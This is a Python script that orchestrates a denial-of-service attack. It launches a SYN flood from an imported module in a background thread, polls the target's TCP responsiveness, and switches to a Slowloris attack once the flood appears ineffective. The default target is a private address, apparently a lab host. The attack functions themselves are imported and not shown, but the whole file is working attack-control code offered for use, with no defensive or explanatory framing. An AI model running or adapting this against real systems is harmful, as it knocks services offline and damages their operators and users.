import sys
import os
import threading
import time
import socket

# Add current directory to sys.path for local module imports
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from syn_flood import syn_flood
from slowloris import slowloris

def is_target_responsive(ip, port, attempts=3, timeout=2):
    """Check if target accepts TCP connections consistently."""
    responsive_count = 0
    for _ in range(attempts):
        try:
            with socket.create_connection((ip, port), timeout=timeout):
                responsive_count += 1
        except socket.error:
            pass
        time.sleep(1)
    return responsive_count == attempts

def start_syn_flood(ip, port):
    """Start the SYN flood attack in a background thread."""
    syn_thread = threading.Thread(target=syn_flood, args=(ip, port), daemon=True)
    syn_thread.start()
    return syn_thread

def controller(target_ip, target_port=80):
    print("[*] Starting SYN flood attack...")
    syn_thread = start_syn_flood(target_ip, target_port)

    while True:
        print("[*] Checking target responsiveness...")
        if is_target_responsive(target_ip, target_port):
            print("[!] Target is responsive, SYN flood ineffective. Switching to Slowloris...")
            # Note: Proper thread management or process handling needed to stop syn_flood cleanly
            slowloris(target_ip, target_port)
            break
        else:
            print("[*] SYN flood is effective, continuing...")
        time.sleep(10)

if __name__ == "__main__":
    controller("192.168.56.10", 80)
